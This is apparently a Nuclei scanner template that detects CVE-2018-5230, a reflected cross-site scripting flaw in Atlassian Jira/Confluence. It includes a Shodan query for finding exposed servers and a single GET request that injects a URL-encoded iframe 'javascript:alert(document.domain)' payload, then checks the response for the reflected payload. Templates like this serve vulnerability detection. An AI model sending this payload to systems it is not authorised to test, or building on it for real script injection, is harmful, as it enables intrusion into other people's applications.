id: CVE-2018-5230

info:
  name: Atlassian Jira Confluence - Cross-Site Scripting
  author: madrobot
  severity: medium
  description: |
    Atlassian Jira Confluence before version 7.6.6, from version 7.7.0 before version 7.7.4, from version 7.8.0 before version 7.8.4, and from version 7.9.0 before version 7.9.2, allows remote attackers to inject arbitrary HTML or JavaScript via a cross-site scripting vulnerability in the error message of custom fields when an invalid value is specified.
  remediation: |
    Apply the latest security patches or updates provided by Atlassian to mitigate this vulnerability.
  reference:
    - https://jira.atlassian.com/browse/JRASERVER-67289
    - https://nvd.nist.gov/vuln/detail/CVE-2018-5230
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2018-5230
    cwe-id: CWE-79
    epss-score: 0.00211
    epss-percentile: 0.58892
    cpe: cpe:2.3:a:atlassian:jira:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: atlassian
    product: jira
    shodan-query: http.component:"Atlassian Confluence"
  tags: cve,cve2018,atlassian,confluence,xss

http:
  - method: GET
    path:
      - "{{BaseURL}}/pages/includes/status-list-mo%3Ciframe%20src%3D%22javascript%3Aalert%28document.domain%29%22%3E.vm"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<iframe src="javascript:alert(document.domain)">'
          - 'confluence'
        condition: and

      - type: word
        part: header
        words:
          - 'text/html'

      - type: status
        status:
          - 200
# digest: 490a0046304402206ea62a0361df5fead0da8ba8b6685a3383c98295145197e774a41160827c2b0b022048b4535b3dfc5b220c924a005fe0aab589fe510bed814245094767791bb6961a:922c64590222798bb761d5b6d8e72950